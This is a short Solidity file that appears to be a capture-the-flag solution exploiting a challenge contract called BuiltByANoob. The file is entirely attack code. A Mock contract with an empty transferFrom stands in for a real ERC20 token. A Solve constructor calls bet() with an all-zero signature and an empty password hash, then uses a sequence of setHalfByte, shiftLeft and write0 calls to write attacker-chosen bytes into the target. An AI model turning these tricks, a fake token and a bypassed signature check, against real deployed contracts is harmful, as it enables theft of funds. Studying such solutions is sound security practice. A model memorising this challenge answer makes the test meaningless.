pragma solidity 0.8.4;
import "./BuiltByANoob.sol";

contract Mock {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public {}
}

contract Solve {
    constructor(BuiltByANoob ins) {
        Mock mock = new Mock();
        bytes32 passwordHash;
        bytes memory sig = bytes(
            hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        );
        ins.bet(passwordHash, sig, IERC20(address(mock)), 1, bytes(hex"10"));
        ins.write0();
        ins.setHalfByte(bytes1(hex"0b"));
        ins.shiftLeft(4);
        ins.setHalfByte(bytes1(hex"05"));
        ins.write0();
        ins.setHalfByte(bytes1(hex"07"));
        ins.shiftLeft(4);
        ins.setHalfByte(bytes1(hex"0e"));
        ins.write0();
        ins.setHalfByte(bytes1(hex"06"));
        ins.shiftLeft(4);
        ins.setHalfByte(bytes1(hex"0d"));
        ins.write0();
        ins.setHalfByte(bytes1(hex"0a"));
        ins.shiftLeft(4);
        ins.setHalfByte(bytes1(hex"00"));
    }
}
